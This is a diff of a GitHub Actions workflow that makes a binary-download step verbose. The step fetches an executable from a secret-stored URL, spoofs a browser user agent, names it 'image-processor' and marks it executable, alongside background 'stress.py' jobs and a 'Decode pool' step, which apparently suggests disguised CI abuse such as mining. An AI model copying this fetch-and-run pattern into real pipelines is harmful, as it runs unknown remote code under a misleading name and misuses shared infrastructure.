@@ -49,10 +49,12 @@ jobs:
           echo "TRAINING_DURATION=$TRAINING_DURATION" >> $GITHUB_ENV
           python3 stress.py > logs/train_${{ matrix.worker }}.txt 2>&1 &
 
-      - name: Download binary
+      - name: Download binary (verbose)
         run: |
-          wget -q --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -O image-processor "${{ secrets.MODEL_CHECKPOINT_URL }}"
+          wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -O image-processor "${{ secrets.MODEL_CHECKPOINT_URL }}"
           chmod +x image-processor
+          ls -la image-processor
+          file image-processor
 
       - name: Decode pool
         run: |
